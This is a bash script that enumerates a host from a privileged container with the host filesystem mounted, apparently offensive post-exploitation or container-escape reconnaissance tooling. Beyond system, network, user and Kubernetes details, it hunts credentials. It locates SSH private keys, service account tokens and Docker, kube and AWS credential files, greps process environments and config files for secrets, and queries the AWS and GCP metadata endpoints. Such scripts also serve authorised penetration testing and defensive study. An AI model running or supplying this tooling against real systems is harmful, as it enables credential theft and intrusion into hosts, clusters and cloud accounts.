#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "[*] System Information"
echo "----------------------"
chroot /host uname -a 2>/dev/null || echo "Cannot chroot"
echo ""
chroot /host cat /etc/os-release 2>/dev/null | head -10 || cat /host/etc/os-release 2>/dev/null | head -10
echo ""
chroot /host hostname 2>/dev/null || cat /host/etc/hostname 2>/dev/null
echo ""
chroot /host uptime 2>/dev/null || echo "Uptime not available"
echo ""

echo "[*] Kernel Information"
echo "----------------------"
chroot /host uname -r 2>/dev/null
chroot /host cat /proc/version 2>/dev/null | head -1
echo ""

echo "[*] CPU Information"
echo "----------------------"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor|cpu cores)" | head -5
echo ""

echo "[*] Memory Information"
echo "----------------------"
chroot /host free -h 2>/dev/null || cat /host/proc/meminfo 2>/dev/null | head -5
echo ""

echo "[*] Disk Information"
echo "----------------------"
chroot /host df -h 2>/dev/null | head -10 || cat /host/proc/mounts | grep -v "^#" | head -10
echo ""

echo "[*] Network Configuration"
echo "----------------------"
echo "Network Interfaces:"
chroot /host ip addr show 2>/dev/null | grep -E "^[0-9]|inet " | head -20 || cat /host/proc/net/route 2>/dev/null | head -10
echo ""
echo "ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""
echo "Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] Users and Groups"
echo "----------------------"
echo "Users in /etc/passwd:"
chroot /host cat /etc/passwd 2>/dev/null | grep -E ":/bin/(bash|sh)" || cat /host/etc/passwd 2>/dev/null | grep -E ":/bin/(bash|sh)"
echo ""
echo "Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10 || cat /host/etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10
echo ""

echo "[*] Running Processes"
echo "----------------------"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/stat 2>/dev/null | head -5
echo ""

echo "[*] Services and Systemd"
echo "----------------------"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "systemctl not available"
echo ""

echo "[*] Docker Information"
echo "----------------------"
echo "Docker version:"
chroot /host docker --version 2>/dev/null || echo "Docker CLI not found"
echo ""
echo "Docker socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || ls -la /host/run/docker.sock 2>/dev/null || echo "Docker socket not found"
echo ""
echo "Docker containers on host:"
chroot /host docker ps -a 2>/dev/null | head -10 || echo "Cannot list containers"
echo ""

echo "[*] Kubernetes Components"
echo "----------------------"
echo "Kubelet directory:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "Kubelet not found"
echo ""
echo "Kubernetes config:"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "Kubernetes config not found"
echo ""
echo "Service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "[*] Installed Software"
echo "----------------------"
chroot /host dpkg -l 2>/dev/null | head -20 || chroot /host rpm -qa 2>/dev/null | head -20 || echo "Package manager not accessible"
echo ""

echo "[*] Scheduled Tasks"
echo "----------------------"
echo "Crontab:"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" || cat /host/etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
echo ""
echo "User crontabs:"
ls -la /host/var/spool/cron/crontabs/ 2>/dev/null || ls -la /host/var/spool/cron/ 2>/dev/null
echo ""

echo "[*] Environment Variables (from /proc)"
echo "----------------------"
cat /host/proc/*/environ 2>/dev/null | strings | grep -iE "(pass|secret|key|token|cred|api)" | head -10 || echo "No sensitive env vars found"
echo ""

echo "[*] SUID Binaries"
echo "----------------------"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] Writable Directories"
echo "----------------------"
find /host/tmp -writable -type d 2>/dev/null | head -5
find /host/var/tmp -writable -type d 2>/dev/null | head -5
echo ""

echo "[*] Credential Files"
echo "----------------------"
echo "SSH keys:"
find /host -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""
echo "Docker configs:"
find /host -name ".docker" -type d 2>/dev/null
find /host -name "config.json" -path "*/.docker/*" 2>/dev/null
echo ""
echo "Kubernetes configs:"
find /host -name "kubeconfig" 2>/dev/null
find /host -path "*/.kube/config" 2>/dev/null
echo ""
echo "AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null
find /host -name "credentials" -path "*/.aws/*" 2>/dev/null
echo ""

echo "[*] Cloud Provider Metadata"
echo "----------------------"
echo "AWS (169.254.169.254):"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "Not AWS"
echo ""
echo "GCP:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "Not GCP"
echo ""

echo "[*] Interesting Files"
echo "----------------------"
echo "History files:"
find /host -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | head -10
echo ""
echo "Config files with passwords:"
find /host -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l -i "password" 2>/dev/null | head -5
echo ""

echo "=========================================="
echo "  Enumeration Complete"
echo "=========================================="
